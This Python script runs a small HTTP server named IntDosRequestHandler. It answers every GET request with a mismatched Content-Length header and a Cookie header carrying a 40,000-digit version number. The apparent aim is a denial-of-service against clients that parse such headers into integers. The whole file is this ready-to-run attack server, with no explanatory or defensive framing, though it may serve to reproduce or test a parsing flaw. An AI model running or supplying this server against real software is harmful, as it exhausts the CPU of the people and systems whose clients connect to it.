#!/usr/bin/env python3
import http.server


class IntDosRequestHandler(http.server.BaseHTTPRequestHandler):
    content_length_digits = 5
    cookie_version_digits = 40_000

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "1" + ("0" * self.content_length_digits))
        self.send_header("Cookie", "version=1" + ("0" * self.cookie_version_digits))
        self.end_headers()
        self.wfile.write(b"Really long content-length")


if __name__ == "__main__":
    http.server.test(HandlerClass=IntDosRequestHandler)
